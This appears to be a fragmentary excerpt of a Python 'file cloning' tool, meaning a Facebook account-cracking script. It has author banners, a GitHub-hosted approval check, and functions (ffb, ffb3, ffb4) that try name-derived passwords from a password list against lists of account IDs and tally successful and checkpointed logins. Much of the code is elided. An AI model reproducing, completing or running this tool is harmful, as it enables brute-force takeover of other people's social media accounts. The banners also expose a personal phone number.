...
\033[1;32m │\33[37;41m\t     MR-N0OB FILE CLONING VERSION   \33[0;m  │
 ...
 \033[1;32m│\033[1;31m➣\033[1;32m FACEBOOK        \033[1;31m:\033[1;32m JAHIDUL ISLAM 
 \033[1;32m│\033[1;31m➣\033[1;91m WHATSAPP        \033[1;31m:\033[1;32m [+8801905054346]
 \033[1;32m│\033[1;31m➣\033[1;32m GITHUB          \033[1;31m:\033[1;32m BK-HUNTER
 \033[1;32m└────────────────────────────────────────────────┘\n""")                                          
  ...
  os.system(f'xdg-open {tan}://www.facebook.com/scam2020')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get(f'https://github.com/bk-hunter/New/blob/main/Emon.txt).text
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+8801905054346?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
\033[1;32m[-] AUTHOR    :\033[1;32m JAHIDUL ISLAM EMON
\033[1;32m[-] GITHUB    :\033[1;32m BK-HUNTER
\033[1;32m[-] FACEBOOK  :\033[1;32m MD JAHIDUL ISLAM 
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS EMON BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [EMON] %s|\033[1;32mSuccessfull:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def ffb3(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [EMON %s|\033[1;32mSuccess:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def ffb4(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [EMON] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
